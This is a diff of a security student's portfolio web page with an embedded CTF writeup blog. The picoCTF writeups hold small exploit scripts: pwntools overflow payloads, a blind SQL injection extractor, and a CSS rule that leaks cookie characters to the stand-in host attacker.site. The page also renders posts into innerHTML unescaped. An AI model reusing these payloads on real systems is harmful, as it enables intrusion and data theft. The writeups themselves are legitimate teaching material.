+          <div class="proj-title">Risk-Based Vulnerability Assessment Platform</div>
+          <div class="proj-desc">AI-driven attack path recommendation engine on Kali Linux. Nmap scanning, NVD/CVE integration, MITRE ATT&CK mapping, Neo4j graph modeling, and a D3.js frontend with composite AI risk scoring.</div>
+          <div class="tags"><span class="tag">Python</span><span class="tag">Flask</span><span class="tag">Neo4j</span><span class="tag">D3.js</span><span class="tag">MITRE ATT&CK</span></div>
+          <div class="proj-links"><a href="https://github.com/cycle-script" class="proj-link" target="_blank">GitHub →</a></div>
+        </div>
+        <div class="proj-card fu">
+          <div class="proj-idx">Project / 002</div>
+          <div class="proj-title">Enterprise Firewall Deployment</div>
+          <div class="proj-desc">Full network redesign and FortiGate deployment for a government organization. Zone-based policies, VLAN segmentation, SD-WAN, VIPs, and dual-WAN failover with comprehensive threat prevention.</div>
+          <div class="tags"><span class="tag">FortiGate</span><span class="tag">SD-WAN</span><span class="tag">VLAN</span><span class="tag">VIP/NAT</span><span class="tag">Segmentation</span></div>
+          <div class="proj-links"><a href="#contact" class="proj-link">Enquire →</a></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- CTF SUMMARY -->
+  <section id="ctf">
+    <div class="sec-lbl">05 — CTF Highlights</div>
+    <h2>CAPTURE THE FLAG</h2>
+    <div class="ctf-grid">
+      <div class="ctf-card fu" onclick="openWriteup('heap-overflow')">
+        <div class="ctf-hd"><span class="ctf-plat">picoCTF</span><span class="ctf-diff dh">● Hard</span></div>
+        <div class="ctf-name">Heap Buffer Overflow</div>
+        <div class="ctf-cat">Binary Exploitation · pwntools</div>
+        <div class="ctf-view">Read Writeup →</div>
+      </div>
+      <div class="ctf-card fu" onclick="openWriteup('aes-cbc')">
+        <div class="ctf-hd"><span class="ctf-plat">picoCTF</span><span class="ctf-diff dh">● Hard</span></div>
+        <div class="ctf-name">AES-CBC Dot Product Oracle</div>
+        <div class="ctf-cat">Cryptography · MILP</div>
+        <div class="ctf-view">Read Writeup →</div>
+      </div>
+      <div class="ctf-card fu" onclick="openWriteup('css-exfil')">
+        <div class="ctf-hd"><span class="ctf-plat">picoCTF</span><span class="ctf-diff dm">● Medium</span></div>
+        <div class="ctf-name">CSS Cookie Exfiltration</div>
+        <div class="ctf-cat">Web Exploitation · No-JS</div>
+        <div class="ctf-view">Read Writeup →</div>
+      </div>
+      <div class="ctf-card fu" onclick="openWriteup('sqli')">
+        <div class="ctf-hd"><span class="ctf-plat">picoCTF</span><span class="ctf-diff dm">● Medium</span></div>
+        <div class="ctf-name">SQL Injection — CSV Report</div>
+        <div class="ctf-cat">Web Exploitation · Burp Suite</div>
+        <div class="ctf-view">Read Writeup →</div>
+      </div>
+      <div class="ctf-card fu" onclick="openWriteup('funcptr')">
+        <div class="ctf-hd"><span class="ctf-plat">picoCTF</span><span class="ctf-diff dm">● Medium</span></div>
+        <div class="ctf-name">Function Pointer Overwrite</div>
+        <div class="ctf-cat">Binary Exploitation · Null-byte</div>
+        <div class="ctf-view">Read Writeup →</div>
+      </div>
+      <div class="ctf-card fu" onclick="showPage('ctf')">
+        <div class="ctf-hd"><span class="ctf-plat">All</span><span class="ctf-diff de">● Active</span></div>
+        <div class="ctf-name">View All Writeups</div>
+        <div class="ctf-cat">Full blog with all solutions</div>
+        <div class="ctf-view">Browse Blog →</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- EDUCATION -->
+  <section id="education">
+    <div class="sec-lbl">06 — Education &amp; Certifications</div>
+    <h2>ACADEMIC PATH</h2>
+    <div class="edu-grid">
+      <div>
+        <div class="edu-sec">Education</div>
+        <div class="tl">
+          <div class="tl-item fu">
+            <div class="tl-date">2023 – 2026</div>
+            <div class="tl-title">BSc Networking &amp; Cybersecurity</div>
+            <div class="tl-org">ISBAT University, Kampala UG</div>
+            <div class="tl-desc">Hands-on offensive security training focusing on web application security, network pentesting, and vulnerability analysis.</div>
+          </div>
+          <div class="tl-item fu">
+            <div class="tl-date">2017 – 2019</div>
+            <div class="tl-title">UACE Certificate</div>
+            <div class="tl-org">St Jonah High School Namugongo, UG</div>
+          </div>
+        </div>
+      </div>
+      <div>
+        <div class="edu-sec">Certifications</div>
+        <div class="tl">
+          <div class="tl-item fu">
+            <div class="tl-date">2025</div>
+            <div class="tl-title">Certified in Cyber</div>
+            <div class="tl-org">ISC2 · Online</div>
+            <div class="tl-desc">Globally recognized entry-level certification covering security principles, risk management, network security, and incident response. Additional certifications on LinkedIn.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- RESUME -->
+  <section id="resume">
+    <div class="sec-lbl">07 — Resume</div>
+    <h2>DOWNLOAD CV</h2>
+    <div class="res-cta fu">
+      <p>A full breakdown of my experience, education, skills, and accomplishments is in my CV. For detailed certification listings, visit my LinkedIn profile.</p>
+      <div style="display:flex;gap:1rem;flex-wrap:wrap;justify-content:center;">
+        <a href="https://www.linkedin.com/in/castro-nicholas" class="btn-p" target="_blank">View LinkedIn Profile</a>
+        <a href="mailto:castronicholas2002@gmail.com?subject=CV%20Request" class="btn-s">Request CV via Email</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- CONTACT -->
+  <section id="contact">
+    <div class="si">
+      <div class="sec-lbl">08 — Contact</div>
+      <h2>LET'S TALK</h2>
+      <div class="contact-grid">
+        <div class="contact-info fu">
+          <p>Available for freelance penetration testing engagements, consulting, and collaboration. If you're looking to secure your infrastructure or just want to talk cybersecurity — reach out.</p>
+          <div class="c-row"><span class="c-key">Email</span><span class="c-val"><a href="mailto:castronicholas2002@gmail.com">castronicholas2002@gmail.com</a></span></div>
+          <div class="c-row"><span class="c-key">Phone</span><span class="c-val">+256 700 305819</span></div>
+          <div class="c-row"><span class="c-key">GitHub</span><span class="c-val"><a href="https://github.com/cycle-script" target="_blank">github.com/cycle-script</a></span></div>
+          <div class="c-row"><span class="c-key">LinkedIn</span><span class="c-val"><a href="https://www.linkedin.com/in/castro-nicholas" target="_blank">castro-nicholas</a></span></div>
+          <div class="c-row"><span class="c-key">Twitter</span><span class="c-val"><a href="https://x.com/cycle_script" target="_blank">@cycle_script</a></span></div>
+        </div>
+        <div class="avail-card fu">
+          <div class="av-title">OPEN TO WORK</div>
+          <div class="av-status"><span class="av-dot"></span><span>Available for engagements</span></div>
+          <p class="av-desc">Currently accepting freelance and consulting engagements in penetration testing, security assessments, and network hardening.</p>
+          <div class="av-types">
+            <div class="av-t">Web Application Penetration Testing</div>
+            <div class="av-t">Network Security Assessments</div>
+            <div class="av-t">Firewall Configuration &amp; Hardening</div>
+            <div class="av-t">Vulnerability Analysis &amp; Reporting</div>
+            <div class="av-t">Security Training &amp; Consulting</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <footer>
+    <div class="ft-in">
+      <span class="ft-copy">© 2025 Castro Nicholas. All rights reserved.</span>
+      <div class="ft-links">
+        <a href="https://github.com/cycle-script" target="_blank">GitHub</a>
+        <a href="https://www.linkedin.com/in/castro-nicholas" target="_blank">LinkedIn</a>
+        <a href="https://x.com/cycle_script" target="_blank">Twitter</a>
+        <a href="mailto:castronicholas2002@gmail.com">Email</a>
+      </div>
+    </div>
   </footer>
+</div><!-- /page-main -->
 
-  <!-- Scroll Top -->
-  <a href="#" id="scroll-top" class="scroll-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>
 
-  <!-- Preloader -->
-  <div id="preloader"></div>
+<!-- ════════════════════════════════════════
+     CTF BLOG PAGE
+════════════════════════════════════════ -->
+<div id="page-ctf" class="page">
+  <div class="blog-hd">
+    <button class="blog-back" onclick="showPage('main')">← Back to Portfolio</button>
+    <div class="blog-ttl">CTF WRITEUPS</div>
+    <div class="blog-sub">// Castro Nicholas · Capture The Flag · Solutions &amp; Techniques</div>
+  </div>
 
-  <!-- Vendor JS Files -->
-  <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
-  <script src="assets/vendor/php-email-form/validate.js"></script>
-  <script src="assets/vendor/aos/aos.js"></script>
-  <script src="assets/vendor/typed.js/typed.umd.js"></script>
-  <script src="assets/vendor/purecounter/purecounter_vanilla.js"></script>
-  <script src="assets/vendor/waypoints/noframework.waypoints.js"></script>
-  <script src="assets/vendor/glightbox/js/glightbox.min.js"></script>
-  <script src="assets/vendor/imagesloaded/imagesloaded.pkgd.min.js"></script>
-  <script src="assets/vendor/isotope-layout/isotope.pkgd.min.js"></script>
-  <script src="assets/vendor/swiper/swiper-bundle.min.js"></script>
+  <div class="add-post" onclick="openModal()">
+    <span class="plus">+</span>
+    <span>Add New Writeup</span>
+  </div>
 
-  <!-- Main JS File -->
-  <script src="assets/js/main.js"></script>
+  <div class="blog-list" id="blogList"></div>
 
+  <div class="post-view hidden" id="postView">
+    <button class="blog-back" onclick="closePost()">← All Writeups</button>
+    <div id="postContent"></div>
+    <div class="post-nav">
+      <button class="pnb" onclick="closePost()">← Back to List</button>
+    </div>
+  </div>
+
+  <footer>
+    <div class="ft-in">
+      <span class="ft-copy">© 2025 Castro Nicholas</span>
+      <div class="ft-links">
+        <a href="https://github.com/cycle-script" target="_blank">GitHub</a>
+        <a href="#" onclick="showPage('main');return false;">Portfolio</a>
+      </div>
+    </div>
+  </footer>
+</div><!-- /page-ctf -->
+
+
+<!-- MODAL -->
+<div class="modal-ov" id="postModal">
+  <div class="modal-box">
+    <div class="modal-ttl">NEW WRITEUP</div>
+    <div class="mrow">
+      <div class="mf"><label class="ml">Challenge Name</label><input class="mi" id="mTitle" placeholder="e.g. Buffer Overflow 101"/></div>
+      <div class="mf"><label class="ml">Platform</label>
+        <select class="msel" id="mPlatform"><option>picoCTF</option><option>HackTheBox</option><option>TryHackMe</option><option>CTFtime</option><option>ICTF</option><option>Other</option></select></div>
+      <div class="mf"><label class="ml">Difficulty</label>
+        <select class="msel" id="mDiff"><option value="easy">Easy</option><option value="medium" selected>Medium</option><option value="hard">Hard</option></select></div>
+    </div>
+    <div class="mrow">
+      <div class="mf"><label class="ml">Category</label><input class="mi" id="mCat" placeholder="e.g. Web Exploitation"/></div>
+      <div class="mf"><label class="ml">Tags (comma separated)</label><input class="mi" id="mTags" placeholder="e.g. SQLi, Burp Suite"/></div>
+      <div class="mf"><label class="ml">Flag (optional)</label><input class="mi" id="mFlag" placeholder="picoCTF{...}"/></div>
+    </div>
+    <div class="mf"><label class="ml">Writeup (Markdown: ## headings, ``` code blocks, `inline`)</label>
+      <textarea class="mta" id="mBody" placeholder="## Overview&#10;Describe the challenge...&#10;&#10;## Approach&#10;How you tackled it...&#10;&#10;## Solution&#10;Final steps..."></textarea></div>
+    <div class="m-acts">
+      <button class="mc" onclick="closeModal()">Cancel</button>
+      <button class="ms" onclick="savePost()">Publish Writeup</button>
+    </div>
+  </div>
+</div>
+
+
+<script>
+/* ─── PAGE ROUTER ─── */
+function showPage(id){
+  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+  document.getElementById('page-'+id).classList.add('active');
+  window.scrollTo(0,0);
+  if(id==='ctf') renderBlogList();
+}
+
+/* ─── CURSOR ─── */
+const cDot=document.getElementById('cDot'),cRing=document.getElementById('cRing');
+let mx=0,my=0,rx=0,ry=0;
+document.addEventListener('mousemove',e=>{mx=e.clientX;my=e.clientY;});
+(function anim(){
+  cDot.style.left=mx+'px';cDot.style.top=my+'px';
+  rx+=(mx-rx)*.12;ry+=(my-ry)*.12;
+  cRing.style.left=rx+'px';cRing.style.top=ry+'px';
+  requestAnimationFrame(anim);
+})();
+document.querySelectorAll('a,button,.proj-card,.ctf-card,.d-item,.blog-entry,.add-post').forEach(el=>{
+  el.addEventListener('mouseenter',()=>cRing.classList.add('h'));
+  el.addEventListener('mouseleave',()=>cRing.classList.remove('h'));
+});
+
+/* ─── FULL-PAGE GLITCH TRANSITION ─── */
+const gCanvas=document.getElementById('gc');
+const gRgb=document.getElementById('grgb');
+const gScan=document.getElementById('gscan');
+const gCtx=gCanvas.getContext('2d');
+
+function resizeGC(){gCanvas.width=window.innerWidth;gCanvas.height=window.innerHeight;}
+resizeGC();window.addEventListener('resize',resizeGC);
+
+function drawSlices(){
+  const w=gCanvas.width,h=gCanvas.height;
+  gCtx.clearRect(0,0,w,h);
+  const n=12+Math.floor(Math.random()*12);
+  for(let i=0;i<n;i++){
+    const y=Math.random()*h;
+    const sh=1+Math.random()*28;
+    const colors=['rgba(0,212,255,','rgba(0,255,136,','rgba(255,0,80,'];
+    const c=colors[Math.floor(Math.random()*colors.length)];
+    gCtx.fillStyle=c+(0.25+Math.random()*.5)+')';
+    gCtx.fillRect(0,y,w,sh);
+    if(Math.random()>.4){
+      gCtx.fillStyle='rgba(255,255,255,'+(0.03+Math.random()*.07)+')';
+      const shift=(Math.random()-.5)*80;
+      gCtx.fillRect(shift,y+sh*.2,w*.5+Math.random()*w*.5,sh*.4);
+    }
+  }
+}
+function drawNoise(a){
+  const w=gCanvas.width,h=gCanvas.height;
+  const id=gCtx.createImageData(w,h);const d=id.data;
+  for(let i=0;i<d.length;i+=4){const v=Math.random()*255*a;d[i]=v;d[i+1]=v;d[i+2]=v;d[i+3]=160;}
+  gCtx.putImageData(id,0,0);
+}
+
+function runGlitch(onDone){
+  gCanvas.classList.add('on');
+  gRgb.style.animation='none'; gScan.style.animation='none';
+  requestAnimationFrame(()=>{
+    gRgb.classList.add('on'); gScan.classList.add('on');
+    gRgb.style.animation=''; gScan.style.animation='';
+  });
+
+  const frames=[
+    ()=>drawSlices(),
+    ()=>{drawNoise(.18);},
+    ()=>drawSlices(),
+    ()=>{drawNoise(.25);drawSlices();},
+    ()=>{gCtx.clearRect(0,0,gCanvas.width,gCanvas.height);drawSlices();},
+    ()=>drawNoise(.1),
+    ()=>drawSlices(),
+    ()=>{gCtx.clearRect(0,0,gCanvas.width,gCanvas.height);},
+    ()=>drawSlices(),
+    ()=>{gCtx.clearRect(0,0,gCanvas.width,gCanvas.height);},
+  ];
+
+  let fi=0;
+  function step(){
+    if(fi<frames.length){ frames[fi++](); setTimeout(step,22+Math.random()*25); }
+    else {
+      gCtx.clearRect(0,0,gCanvas.width,gCanvas.height);
+      gCanvas.classList.remove('on');
+      setTimeout(()=>{
+        gRgb.classList.remove('on');gScan.classList.remove('on');
+        if(onDone) onDone();
+      },60);
+    }
+  }
+  step();
+}
+
+/* ─── THEME TOGGLE ─── */
+const togBtn=document.getElementById('togBtn'),togLbl=document.getElementById('togLbl');
+let dark=false;
+togBtn.addEventListener('click',()=>{
+  runGlitch(()=>{
+    dark=!dark;
+    document.documentElement.setAttribute('data-theme',dark?'dark':'light');
+    togLbl.textContent=dark?'Dark':'Light';
+  });
+});
+
+/* ─── TYPEWRITER ─── */
+const tq="Code and networks is poetry. Hacking is the art of rewriting the verses.";
+const tEl=document.getElementById('hTag');
+let ti=0;
+const cur=document.createElement('span');cur.className='tc';tEl.appendChild(cur);
+function typeIt(){
+  if(ti<tq.length){tEl.insertBefore(document.createTextNode(tq[ti++]),cur);setTimeout(typeIt,36+Math.random()*26);}
+}
+setTimeout(typeIt,900);
+
+/* ─── SCROLL FADE ─── */
+const fObs=new IntersectionObserver(es=>{
+  es.forEach((e,i)=>{if(e.isIntersecting){setTimeout(()=>e.target.classList.add('v'),i*72);fObs.unobserve(e.target);}});
+},{threshold:.1});
+document.querySelectorAll('.fu').forEach(el=>fObs.observe(el));
+
+/* ─── SKILL BARS ─── */
+const bObs=new IntersectionObserver(es=>{
+  es.forEach(e=>{if(e.isIntersecting){e.target.querySelectorAll('.sk-b').forEach(b=>b.style.width=b.dataset.w+'%');bObs.unobserve(e.target);}});
+},{threshold:.3});
+document.querySelectorAll('.skill-cat').forEach(el=>bObs.observe(el));
+
+/* ─── BLOG DATA ─── */
+const DEFAULTS=[
+  {id:'heap-overflow',platform:'picoCTF',difficulty:'hard',date:'2025-03-10',
+   title:'Heap Buffer Overflow',category:'Binary Exploitation',
+   tags:['pwntools','heap','buffer overflow'],
+   excerpt:'Exploited a heap buffer overflow to overwrite a function pointer and redirect execution, solved remotely via pwntools.',
+   body:`## Overview\nA heap-based challenge where overflowing a chunk overwrote an adjacent function pointer.\n\n## Environment\nRemote server. Binary provided for local analysis using GDB + PEDA.\n\n## Approach\nMapped the heap layout, identified chunk sizing mismatch — 24 byte allocation accepting 40 bytes input. The 16-byte overflow reached the function pointer in the next chunk.\n\n## Null Byte Issue\nInitial payload had a null byte at the boundary. Adjusted padding to avoid null termination stripping.\n\n## Exploit\n\`\`\`python\nfrom pwn import *\n\np = remote('challenge.ctf.example', 4444)\nwin_addr = 0x08049256\n\npayload  = b'A' * 24\npayload += p32(win_addr)\n\np.sendline(payload)\np.interactive()\n\`\`\``,
+   flag:'picoCTF{h34p_0v3rfl0w_pwn3d}'},
+  {id:'aes-cbc',platform:'picoCTF',difficulty:'hard',date:'2025-02-18',
+   title:'AES-CBC Dot Product Oracle',category:'Cryptography',
+   tags:['AES','CBC','MILP','oracle'],
+   excerpt:'Dynamic session oracle where dot product relationships between plaintexts and key bytes could be exploited via MILP to recover the key.',
+   body:`## Overview\nAES-CBC oracle returning a 1-bit response based on a dot product condition between plaintext and key bytes.\n\n## Session Parsing\n\`\`\`python\nimport base64, json\n\ndef parse_session(token):\n    decoded = base64.b64decode(token)\n    return json.loads(decoded)\n\`\`\`\n\n## MILP Model\nEach oracle response added a linear constraint over key bytes [0,255].\n\n\`\`\`python\nfrom mip import Model, xsum, INTEGER\n\nm = Model()\nkey = [m.add_var(var_type=INTEGER, lb=0, ub=255) for _ in range(16)]\n\nfor pt, result in queries:\n    expr = xsum(pt[i]*key[i] for i in range(16))\n    if result == 1:\n        m += expr >= 1\n    else:\n        m += expr == 0\n\nm.optimize()\nrecovered = bytes([int(k.x) for k in key])\n\`\`\``,
+   flag:'picoCTF{d0t_pr0duct_0r4cl3}'},
+  {id:'css-exfil',platform:'picoCTF',difficulty:'medium',date:'2025-01-29',
+   title:'CSS Cookie Exfiltration',category:'Web Exploitation',
+   tags:['CSS','no-JS','cookie','oracle'],
+   excerpt:'Cookie exfiltration using only CSS attribute selectors — no JavaScript allowed. Built a character oracle using CSS import chains.',
+   body:`## Overview\nCSP blocked all JS. Flag was in a session cookie accessible to the page. Goal: exfiltrate using CSS only.\n\n## CSS Attribute Selector Oracle\n\`\`\`css\ninput[value^="picoCTF{a"] {\n    background: url('https://attacker.site/leak?c=a');\n}\n\`\`\`\n\n## Automation\nInjected 62 rules per character position. Captured callbacks on a local server.\n\n\`\`\`python\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\n\nhits = []\nclass H(BaseHTTPRequestHandler):\n    def do_GET(self):\n        hits.append(self.path)\n        self.send_response(200); self.end_headers()\n\nHTTPServer(('0.0.0.0',8080),H).serve_forever()\n\`\`\`\n\nReconstructed flag character by character.`,
+   flag:'picoCTF{css_0r4cl3_l34k}'},
+  {id:'sqli',platform:'picoCTF',difficulty:'medium',date:'2024-12-14',
+   title:'SQL Injection — CSV Report',category:'Web Exploitation',
+   tags:['SQLi','Burp Suite','SQLite','blind'],
+   excerpt:'Blind SQL injection via a CSV report endpoint. Extracted the flag from SQLite using SUBSTR-based inference, automated with Python.',
+   body:`## Overview\nCSV report endpoint passed user input directly into a SQLite query.\n\n## Discovery\nIntercepted in Burp Suite. The \`type\` parameter was injectable:\n\`GET /report?type=sales' --\`\n\n## Extraction\n\`\`\`python\nimport requests, string\n\nflag = ''\nfor i in range(1, 50):\n    for c in string.printable:\n        r = requests.get(\n            'http://chall/report',\n            params={'type': f"sales' AND SUBSTR((SELECT flag FROM secrets),{i},1)='{c}' --"}\n        )\n        if 'Error' not in r.text:\n            flag += c; break\n    if '}' in flag: break\n\nprint(flag)\n\`\`\``,
+   flag:'picoCTF{bl1nd_sql1_ftw}'},
+  {id:'funcptr',platform:'picoCTF',difficulty:'medium',date:'2024-11-22',
+   title:'Function Pointer Overwrite',category:'Binary Exploitation',
+   tags:['buffer overflow','function pointer','pwntools'],
+   excerpt:'Stack-based overflow to overwrite a function pointer in an adjacent struct. Required careful null byte avoidance in the payload.',
+   body:`## Overview\nGlobal struct with a char buffer[32] and a function pointer. \`gets()\` — no bounds check.\n\n## Exploit\n\`\`\`python\nfrom pwn import *\n\nelf = ELF('./chall')\nwin = elf.symbols['win']\n\np = remote('chall.ctf.example', 9999)\npayload = b'A'*32 + p32(win)\np.sendline(payload)\np.interactive()\n\`\`\``,
+   flag:'picoCTF{funcptr_0v3rwr1t3}'}
+];
+
+let posts = JSON.parse(localStorage.getItem('cn_posts')||'null')||DEFAULTS;
+function savePosts(){localStorage.setItem('cn_posts',JSON.stringify(posts));}
+
+function renderBlogList(){
+  const list=document.getElementById('blogList');
+  const view=document.getElementById('postView');
+  list.style.display='flex'; view.classList.add('hidden');
+  list.innerHTML=posts.map(p=>`
+    <div class="blog-entry" onclick="openPost('${p.id}')">
+      <div class="be-meta">
+        <div class="be-date">${p.date}</div>
+        <span class="be-plat">${p.platform}</span>
+      </div>
+      <div class="be-body">
+        <div class="be-title">${p.title}</div>
+        <div class="be-exc">${p.excerpt}</div>
+        <div class="be-tags">${p.tags.map(t=>`<span class="tag">${t}</span>`).join('')}</div>
+      </div>
+      <div class="be-arr">→</div>
+    </div>`).join('');
+}
+
+function openPost(id){
+  const p=posts.find(x=>x.id===id);if(!p)return;
+  document.getElementById('blogList').style.display='none';
+  const view=document.getElementById('postView');view.classList.remove('hidden');
+  const dc={easy:'de',medium:'dm',hard:'dh'}[p.difficulty]||'dm';
+  document.getElementById('postContent').innerHTML=`
+    <span class="post-badge">${p.platform}</span>
+    <div class="post-title">${p.title}</div>
+    <div class="post-meta-bar">
+      <span class="pm">${p.date}</span>
+      <span class="pm">${p.category}</span>
+      <span class="ctf-diff ${dc}">● ${p.difficulty[0].toUpperCase()+p.difficulty.slice(1)}</span>
+      ${p.tags.map(t=>`<span class="tag">${t}</span>`).join('')}
+    </div>
+    <div class="post-body">${md(p.body)}</div>
+    ${p.flag?`<div class="post-flag">🚩 ${p.flag}`:''}`;
+  window.scrollTo(0,0);
+}
+function closePost(){renderBlogList();}
+function openWriteup(id){showPage('ctf');setTimeout(()=>openPost(id),80);}
+
+function md(s){
+  return s
+    .replace(/^## (.+)$/gm,'<h3>$1</h3>')
+    .replace(/^# (.+)$/gm,'<h3>$1</h3>')
+    .replace(/```[\w]*\n([\s\S]*?)```/gm,'<pre><code>$1</code></pre>')
+    .replace(/`([^`]+)`/g,'<code>$1</code>')
+    .replace(/\*\*(.+?)\*\*/g,'<strong>$1</strong>')
+    .replace(/\n\n/g,'</p><p>')
+    .replace(/^/,'<p>').replace(/$/,'</p>')
+    .replace(/<p>(<h3|<pre)/g,'$1').replace(/<\/(h3|pre)><\/p>/g,'</$1>');
+}
+
+/* ─── MODAL ─── */
+function openModal(){document.getElementById('postModal').classList.add('open');}
+function closeModal(){document.getElementById('postModal').classList.remove('open');}
+function savePost(){
+  const t=document.getElementById('mTitle').value.trim();
+  if(!t){alert('Please enter a challenge name.');return;}
+  const id=t.toLowerCase().replace(/\s+/g,'-').replace(/[^a-z0-9-]/g,'')+'-'+Date.now();
+  const tags=document.getElementById('mTags').value.split(',').map(x=>x.trim()).filter(Boolean);
+  posts.unshift({
+    id,title:t,
+    platform:document.getElementById('mPlatform').value,
+    difficulty:document.getElementById('mDiff').value,
+    date:new Date().toISOString().slice(0,10),
+    category:document.getElementById('mCat').value.trim()||'Misc',
+    tags,
+    excerpt:document.getElementById('mBody').value.slice(0,160).replace(/[#`*]/g,'').trim()+'…',
+    body:document.getElementById('mBody').value,
+    flag:document.getElementById('mFlag').value.trim()
+  });
+  savePosts();closeModal();
+  ['mTitle','mCat','mTags','mFlag','mBody'].forEach(i=>document.getElementById(i).value='');
+  renderBlogList();
+}
+document.getElementById('postModal').addEventListener('click',function(e){if(e.target===this)closeModal();});
+</script>
 </body>
-
 </html>
